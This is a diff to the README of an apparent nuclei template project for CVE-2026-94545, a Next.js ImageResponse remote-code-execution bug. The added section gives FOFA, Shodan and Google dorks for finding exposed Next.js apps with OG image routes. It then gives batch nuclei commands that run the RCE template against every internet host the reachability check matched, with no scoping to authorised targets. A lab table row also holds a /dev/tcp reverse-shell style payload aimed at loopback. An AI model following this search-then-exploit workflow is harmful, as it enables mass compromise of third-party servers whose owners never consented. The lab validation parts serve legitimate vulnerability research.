@@ -140,6 +140,62 @@ The JavaScript protocol does not expose `BaseURL`, so the base is built from `{{
 and only one candidate when the base already carries a scheme or a port that identifies it
 (`80`, `443`). A candidate that cannot answer a benign request is skipped.
 
+## Finding candidates (FOFA, Shodan, Google)
+
+Neither the Next.js version nor the presence of `sharp` nor the existence of an OG route is
+exposed as a banner or a header, so a search engine can only narrow the field — the
+reachability template is what actually decides. Use them in that order:
+
+**dork → `CVE-2026-94545.yaml` → `CVE-2026-94545-rce.yaml`** (the last step only on hosts the
+reachability check matched).
+
+| Query | Finds | Notes |
+| --- | --- | --- |
+| `header="X-Powered-By: Next.js"` | every Next.js app that kept the default banner | widest net; `poweredByHeader: false` hides it |
+| `app="Next.js"` | FOFA's own fingerprint rule | same population, independent of the header |
+| `body="/_next/static/chunks/" && body="self.__next_f.push"` | App Router (Next 13+) | the flight-payload marker only exists in App Router |
+| `body="__NEXT_DATA__"` | Pages Router | not where this bug lives, but useful for inventory |
+| `body="opengraph-image"` | apps using the `opengraph-image` file convention — i.e. `ImageResponse` users | best single marker for this CVE |
+| `body="/api/og"` | apps with a hand-written ImageResponse route (`/api/og`, `/og`) | only matches when the route is referenced from the HTML (og:image meta tag, flight payload) |
+| `body="og:image" && body="/api/og"` | the previous one, with fewer marketing-page false positives | |
+
+The combination that ships in both templates' metadata (Shodan and Google equivalents next
+to it) is:
+
+```
+header="X-Powered-By: Next.js" && (body="opengraph-image" || body="/api/og")
+```
+
+The body markers are not folklore: `lab/check-dorks.sh` builds a throwaway Next.js 16.3.5
+app with the `opengraph-image` convention and greps what it actually serves — the emitted
+`<meta property="og:image" content="…/opengraph-image?<hash>">` carries the marker, and the
+App Router flight payload carries `self.__next_f.push` (3/3 checks).
+
+FOFA links are shareable as base64 of the query, e.g. the header dork is
+<https://en.fofa.info/result?qbase64=aGVhZGVyPSJYLVBvd2VyZWQtQnk6IE5leHQuanMi>.
+An account is required for result counts; queries are free-form, so drop the `og` clauses to
+widen and add `port="443"` (or `country="…"`) to scope.
+
+Two things no dork can see, and both are what the template is for:
+
+1. **The dynamic-text condition** — the app has to feed request data into `ImageResponse`.
+   A site that only renders static OG images is not affected even if it is on a vulnerable
+   version. The reachability template measures this with a differential probe
+   (injected markup vs. control) instead of trusting a fingerprint.
+2. **Runtime and renderer** — `runtime = 'nodejs'` plus `sharp` installed. Edge-only
+   deployments and installs without `sharp` fall back to the sandboxed `resvg-wasm`
+   renderer and are not exploitable; the same differential probe returns "not matched".
+
+For a batch, the real binary handles target lists directly:
+
+```bash
+nuclei -l candidates.txt -t CVE-2026-94545.yaml     -dut -stats   # reachability first
+nuclei -l matches.txt    -t CVE-2026-94545-rce.yaml -dut           # only where it matched
+```
+
+`lab/run-nuclei.sh` is single-target (it is the offline harness); use it for one host at a
+time, or `-l` with the real nuclei as above.
+
 ## How the detection template decides
 
 It injects the same `xi:include`/`data:` construct twice, byte-for-byte the same length:
@@ -191,6 +247,7 @@ nuclei" in `lab/README.md` for the same checks with the real tool).
 | Lab app fidelity vs EQSTLab/CVE-2026-94545@main | `lab/check-upstream.sh`: dependencies, runtime pin, both request shapes and the `<title>` sink all identical |
 | Templates vs the published app source (`lab/test-upstream-app.sh`) | 6/6: detection matches (probe 2,522,895 B, ratio 114.8), exploit delivers, callback `uid=1001(user)…`, process replaced |
 | Template payload vs the advisory's `exploit.py` (`lab/compare-payload.sh`) | byte-identical for `id`, `bash -c 'id>/dev/tcp/127.0.0.1/4444'` and a 71-byte command |
+| FOFA/Shodan markers (`lab/check-dorks.sh`) | 3/3: `opengraph-image` and `self.__next_f.push` present in a real Next.js 16.3.5 HTML response |
 
 Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
 `nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
